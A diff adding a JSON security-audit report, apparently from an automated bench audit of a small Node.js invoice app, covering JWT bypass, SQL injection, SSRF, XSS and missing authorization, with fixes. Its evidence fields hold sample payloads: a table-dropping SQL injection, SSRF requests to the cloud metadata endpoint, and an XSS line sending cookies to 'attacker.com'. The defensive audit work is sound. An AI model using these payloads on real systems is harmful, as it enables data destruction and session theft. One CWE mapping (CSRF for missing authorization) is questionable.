@@ -1,0 +1,422 @@
+{
+  "schema_version": "ehs.findings/v1",
+  "engagement": {
+    "scope": "/private/tmp/claude-501/-Users-cristianajavi/ddae72cd-6c1e-4c0c-be51-8f91cd87d164/scratchpad/t2/target",
+    "commit": "audit-manual-read",
+    "mode": "audit",
+    "language": "en",
+    "generated_by": "ethical-hacker-squad/audit-lead",
+    "coverage": {
+      "inventoried": [
+        "routes/invoices.js \u2014 HTTP API endpoints",
+        "lib/auth.js \u2014 JWT authentication",
+        "lib/remote.js \u2014 Remote HTTP fetching",
+        "lib/render.js \u2014 HTML rendering",
+        "lib/db.js \u2014 Database abstraction",
+        "package.json \u2014 Dependencies"
+      ],
+      "read": [
+        "routes/invoices.js \u2014 HTTP API endpoints",
+        "lib/auth.js \u2014 JWT authentication",
+        "lib/remote.js \u2014 Remote HTTP fetching",
+        "lib/render.js \u2014 HTML rendering",
+        "package.json \u2014 Dependencies"
+      ],
+      "not_read": [
+        "lib/db.js \u2014 Database abstraction (stub only)"
+      ]
+    },
+    "unaided_pass": {
+      "candidates": [
+        "C-JWT-001: JWT decoded without verification",
+        "C-SQL-001: SQL injection via ORDER BY parameter",
+        "C-SSRF-001: Unvalidated URL fetch in fetchLogo",
+        "C-XSS-001: HTML injection in invoiceNote function",
+        "C-AUTHZ-001: Missing authorization check on /invoices/:id",
+        "C-AUTHZ-002: Object-level authorization missing on /invoices/:id"
+      ],
+      "reported": [
+        "F-001",
+        "F-002",
+        "F-003",
+        "F-004",
+        "F-005"
+      ],
+      "dropped": [
+        {
+          "label": "C-AUTHZ-002",
+          "resolution": "merged",
+          "merged_into": "F-005"
+        }
+      ]
+    },
+    "coverage_declaration": "Exercised: WEB-01 (authentication and JWT), WEB-02 (authorization), WEB-03 (injection \u2014 SQL and XSS), WEB-04 (SSRF). Not exercised: client-side logic, CORS, deserialization, file upload, GraphQL, rate limiting, error handling (out of scope for bench audit).",
+    "authorization": "None \u2014 audit mode, local analysis only."
+  },
+  "findings": [
+    {
+      "id": "F-001",
+      "title": "JWT decoded without verification allows authentication bypass",
+      "procedure": "WEB-01",
+      "status": "confirmed",
+      "severity": "critical",
+      "confidence": "high",
+      "location": "lib/auth.js:6, lib/auth.js:12",
+      "evidence": "Lines 6 and 12 use `jwt.decode(bearer)` without calling `jwt.verify()`. Any attacker can forge a JWT with arbitrary claims (sub, role, tenant) and bypass authentication.",
+      "impact": "An attacker can assume any user's identity and role, accessing any resource the application exposes.",
+      "preconditions": "None \u2014 the attacker only needs to craft a JWT with the desired claims.",
+      "recommendation": "Replace `jwt.decode()` with `jwt.verify(bearer, secret)` using a strong, server-side secret. Store the secret in an environment variable and never commit it. Verify the JWT signature and expiration before trusting its claims.",
+      "verification": "not executed",
+      "traceability": "CWE-347: Improper Verification of Cryptographic Signature",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No compensating control enforces JWT verification. The application reads claims directly without validation."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The bearer token is attacker-controlled; any string in the Authorization header is decoded."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a sink-form issue \u2014 jwt.decode() is inherently unsafe without verification."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This code path is in the production HTTP handlers, not test scaffolding."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Authentication is not an intended exposure; it is a required security control."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An attacker crosses the trust boundary by impersonating another user."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "User identity is sensitive data."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No external control is claimed. The code is responsible for verification."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "jwt.decode() is what it looks like: decoding without verification."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a defence-in-depth issue. It is the primary authentication mechanism."
+        }
+      ],
+      "limits": "Audit does not confirm whether the secret (if added) would be strong or if the application uses HTTPS exclusively.",
+      "unaided_label": "C-JWT-001"
+    },
+    {
+      "id": "F-002",
+      "title": "SQL injection via unsanitized ORDER BY parameter",
+      "procedure": "WEB-03",
+      "status": "confirmed",
+      "severity": "critical",
+      "confidence": "high",
+      "location": "routes/invoices.js:24",
+      "evidence": "Line 24: `const order = req.query.order || 'created_at'; ... ORDER BY ${order}`. The `order` parameter is user-supplied and directly interpolated into the SQL query string. An attacker can inject arbitrary SQL, e.g., `?order=created_at; DROP TABLE invoices;--`.",
+      "impact": "An attacker can execute arbitrary SQL, reading, modifying or deleting data, or executing commands on the database server depending on its configuration.",
+      "preconditions": "The attacker must be able to send an HTTP GET request to /invoices.",
+      "recommendation": "Use parameterized queries or a whitelist. For ORDER BY (which cannot be parameterized), whitelist acceptable values: `const column = { created_at: 'created_at', amount: 'amount' }[order] || 'created_at'`. Reject any order not in the whitelist.",
+      "verification": "not executed",
+      "traceability": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection), OWASP A03:2021 Injection",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No middleware or ORM enforces parameterization of ORDER BY."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "req.query.order is attacker-controlled via the URL query string."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Template-string interpolation directly builds a SQL command, which the database executes."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is production code in the main routes handler."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "SQL injection is not an intended exposure."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The attacker crosses the trust boundary to access data and modify the database."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Invoice data is sensitive."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No external database-level protection is visible in the code."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Template-string interpolation in SQL is what it looks like: injection vulnerability."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a defence-in-depth item; it is the primary query path."
+        }
+      ],
+      "limits": "The audit assumes the database connection allows executing raw SQL. If the database enforces statement preparation or has row-level security, the impact may be reduced, but that is not visible in the code.",
+      "unaided_label": "C-SQL-001"
+    },
+    {
+      "id": "F-003",
+      "title": "Unvalidated URL fetch enables SSRF attacks",
+      "procedure": "WEB-04",
+      "status": "probable",
+      "severity": "high",
+      "confidence": "high",
+      "location": "lib/remote.js:5-8, routes/invoices.js:38",
+      "evidence": "The fetchLogo(url) function at lib/remote.js:5-8 accepts any URL and fetches it via node-fetch without validation. The /branding/preview endpoint (routes/invoices.js:38) calls fetchLogo(req.body.logoUrl) directly with user input. An attacker can supply http://localhost:8080/admin or http://169.254.169.254/latest/meta-data/ to access internal services.",
+      "impact": "An attacker can read data from internal services (metadata endpoints, admin panels, private APIs) or internal network resources, or trigger actions on internal services.",
+      "preconditions": "The attacker must be able to POST to /branding/preview. No authentication check is visible, so this may be unauthenticated.",
+      "recommendation": "Implement URL validation: (1) Parse the URL and reject localhost, private IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, ::1), metadata endpoints (169.254.169.254) and internal hostnames. (2) Use a DNS allowlist if the application should only fetch from specific domains. (3) Disable redirects or validate redirect targets. The code allows `{ redirect: 'follow' }` without checking the final URL.",
+      "verification": "not executed",
+      "traceability": "CWE-918: Server-Side Request Forgery (SSRF), OWASP A10:2021 Server-Side Request Forgery (SSRF)",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No network-layer or application-layer firewall is visible in the code to block internal access."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "req.body.logoUrl is attacker-controlled via the POST request body."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "node-fetch interprets and executes the URL."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is production code."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "SSRF is not an intended exposure."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The attacker reaches internal services outside the application's trust boundary."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Internal service data is sensitive."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "UNKNOWN",
+          "reason": "Network segmentation or endpoint ACLs may restrict internal access, but no evidence is visible in the code or configuration."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "node-fetch(url) is what it looks like: fetching an attacker-supplied URL."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "SSRF is not a defence-in-depth item; it is a direct vulnerability."
+        }
+      ],
+      "limits": "Verification of network-layer controls (VPC, security groups, egress filtering) is not possible from source code alone and would require testing the running application.",
+      "unaided_label": "C-SSRF-001",
+      "inference": "Whether network-layer controls (VPC security groups, egress filtering, firewall rules) prevent access to internal IP ranges is not visible in the application code.",
+      "what_would_settle_it": "Evidence of network segmentation or firewall rules in deployment configuration (VPC settings, security group rules, egress deny-all policies) that prevent the application from reaching 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, or 169.254.169.254."
+    },
+    {
+      "id": "F-004",
+      "title": "HTML injection in invoice note field",
+      "procedure": "WEB-03",
+      "status": "confirmed",
+      "severity": "high",
+      "confidence": "high",
+      "location": "lib/render.js:4-5",
+      "evidence": "The invoiceNote(note) function returns `<div class=\"note\">${note}</div>` without escaping. The customerName(name) function (lines 9-10) correctly uses escapeHtml(name). If invoiceNote is used to render user-supplied content, an attacker can inject HTML and JavaScript: `<img src=x onerror='fetch(\"http://attacker.com?cookie=\"+document.cookie)'>`.",
+      "impact": "An attacker can inject arbitrary HTML and JavaScript into the page, stealing session cookies, redirecting users, phishing, or defacing the invoice.",
+      "preconditions": "The invoice note must be rendered in an HTML context (a browser). The application must send the rendered HTML to the client without a Content-Security-Policy that blocks inline scripts.",
+      "recommendation": "Use escapeHtml(note) just like customerName does. Apply the same escaping to invoiceNote and any other user-controlled HTML content: `return '<div class=\"note\">' + escapeHtml(note) + '</div>';`. Alternatively, use a templating engine that escapes by default.",
+      "verification": "not executed",
+      "traceability": "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting), OWASP A07:2021 Cross-Site Scripting (XSS)",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No Content-Security-Policy or other middleware enforces script blocking. (A CSP with script-src 'none' would mitigate, but it is not visible in the code.)"
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The note parameter comes from user input (likely a form or API request)."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The HTML is returned as a string and rendered by the browser as executable markup."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is production code."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "HTML injection is not an intended exposure."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An attacker (viewing the invoice in a browser) can target other users viewing the same invoice."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Cookies and session tokens are sensitive."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No external filter is claimed."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Template-string interpolation without escaping is what it looks like: injection."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a defence-in-depth item; it is the primary rendering path."
+        }
+      ],
+      "limits": "The audit assumes the rendered HTML is sent to a browser and not pre-escaped by a downstream layer. If the application uses an HTML sanitizer or template engine that escapes by default, the risk may be reduced.",
+      "unaided_label": "C-XSS-001"
+    },
+    {
+      "id": "F-005",
+      "title": "Missing authentication and authorization on invoice endpoints",
+      "procedure": "WEB-02",
+      "status": "confirmed",
+      "severity": "critical",
+      "confidence": "high",
+      "location": "routes/invoices.js:7-10, 13-19",
+      "evidence": "The /invoices/:id endpoint (line 7-10) has no authentication check and no authorization check. It simply returns all data for the requested ID without verifying the user owns it. The /receipts/:id endpoint (line 13-19) checks req.user.id, but req.user is never set in the visible code; no authentication middleware is attached.",
+      "impact": "An attacker can read any invoice or receipt by guessing or enumerating IDs. Combined with the JWT vulnerability (F-001), an attacker can assume any user's identity and access all their data.",
+      "preconditions": "The attacker must know or guess the invoice ID. Numeric IDs (1, 2, 3, \u2026) or UUIDs from error messages may be enumerable.",
+      "recommendation": "(1) Add authentication middleware that verifies the JWT using jwt.verify() and sets req.user. (2) For object-level authorization, check ownership before returning data: `if (invoice.owner_id !== req.user.id) throw new Unauthorized()`. (3) Apply the same check to all endpoints that return user data.",
+      "verification": "not executed",
+      "traceability": "CWE-352: Cross-Site Request Forgery (CSRF), CWE-639: Authorization Bypass Through User-Controlled Key, OWASP A01:2021 Broken Access Control",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No middleware enforces authentication or authorization."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The invoice ID comes from the URL path (req.params.id), which is attacker-controlled."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "NOT_APPLICABLE",
+          "reason": "This is an authorization issue, not a sink-form issue."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is production code."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Unauthenticated access to invoices is not an intended exposure."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The attacker accesses another user's data, crossing a trust boundary."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Invoice data is sensitive."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No external authorization service is claimed in the code."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The code path is straightforward: fetch and return."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Authorization is not a defence-in-depth item; it is the primary access control."
+        }
+      ],
+      "limits": "The audit assumes numeric or enumerable IDs. If IDs are cryptographically random UUIDs, enumeration is harder but not impossible (especially if IDs leak in error messages, logs, or the /invoices list endpoint).",
+      "unaided_label": "C-AUTHZ-001"
+    }
+  ],
+  "ruled_out": [
+    {
+      "title": "File upload vulnerabilities",
+      "bound": "No file upload endpoint is present in the codebase.",
+      "confidence": "high"
+    },
+    {
+      "title": "GraphQL injection",
+      "bound": "No GraphQL schema or resolver is present.",
+      "confidence": "high"
+    },
+    {
+      "title": "Dependency vulnerabilities in listed packages",
+      "bound": "Dependencies are present (express, jsonwebtoken, node-fetch, escape-html) but a full supply-chain audit with known CVE checking is out of scope for a manual bench audit. A specialist audit of supply-chain.md \u00a71-\u00a74 would be needed for that.",
+      "confidence": "medium"
+    }
+  ]
+}
